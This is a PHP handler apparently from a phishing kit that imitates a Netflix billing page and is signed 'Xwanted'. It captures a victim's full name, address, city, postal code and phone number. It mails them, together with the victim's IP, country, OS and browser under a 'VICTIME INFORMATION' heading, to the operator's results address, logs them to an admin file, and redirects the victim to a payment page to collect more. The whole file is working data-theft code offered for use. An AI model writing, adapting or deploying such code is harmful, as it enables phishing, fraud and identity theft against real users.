<?php
session_start();
header('Location: ../payment');
require 'Email.php';
require 'getdata.php';
$_SESSION["xal"] = $_POST['al'];
$_SESSION["xcity"] = $_POST['city'];
$_SESSION["xzip"] = $_POST['zip'];
$fn = $_POST['fn'];
$al = $_POST['al'];
$city = $_POST['city'];
$zip = $_POST['zip'];
$pn = $_POST['pn'];
$to = "$rzlt_mail";
$subject = "👑 NFX BILLING | ".$ip." | ".$country." | " .$user_os;
$message = "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>NFX BILLING FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Full Name] = <font style='color:#0070ba;'>$fn</font><br>
<font style='color:#9c0000;'>✪</font> [Country] = <font style='color:#0070ba;'>$country</font><br>
<font style='color:#9c0000;'>✪</font> [Adress Line] = <font style='color:#0070ba;'>$al</font><br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>$city</font><br>
<font style='color:#9c0000;'>✪</font> [Postal Code] = <font style='color:#0070ba;'>$zip</font><br>
<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>$pn</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>BY ✪ Xwanted ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:⭐XWANTED⭐ <xwanted@rez.co.uk>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/data/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>